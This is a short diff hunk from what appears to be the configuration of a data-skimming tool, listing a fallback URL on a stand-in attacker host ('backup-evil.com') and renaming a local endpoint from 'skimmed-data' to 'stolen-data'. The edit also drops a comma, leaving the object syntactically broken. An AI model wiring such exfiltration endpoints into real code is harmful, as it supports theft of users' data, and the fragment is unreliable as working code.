@@ -34,7 +34,7 @@
     fallbackUrl: 'http://backup-evil.com/data',
 
     // Local development server
-    devUrl: 'http://localhost:9006/skimmed-data',
+    devUrl: 'http://localhost:9006/stolen-data'
     healthUrl: 'http://localhost:9006/health',
 
     // Data collection settings
